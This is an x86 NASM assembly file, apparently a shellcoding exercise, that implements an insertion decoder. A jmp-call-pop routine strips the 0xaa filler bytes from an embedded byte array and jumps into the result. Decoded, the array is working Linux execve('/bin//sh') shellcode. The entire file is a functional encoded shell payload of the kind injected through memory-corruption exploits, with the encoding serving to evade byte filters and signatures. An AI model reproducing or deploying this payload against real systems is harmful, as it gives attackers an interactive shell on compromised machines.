; Insertion-Decoder.nasm
; Author: Ravehorn

global _start

section .text

_start:

    jmp short call_decoder

decoder:
    
    pop esi
    lea edi, [esi + 1]
    xor eax, eax
    mov al, 1
    xor ebx, ebx
    
decode:

    mov bl, byte [esi + eax]
    xor bl, 0xaa
    jnz short shellcode
    mov bl, byte [esi + eax + 1]
    mov byte [edi], bl
    inc edi
    add al, 2
    jmp short decode

call_decoder:

    call decoder

    shellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa, 0xbb, 0xbb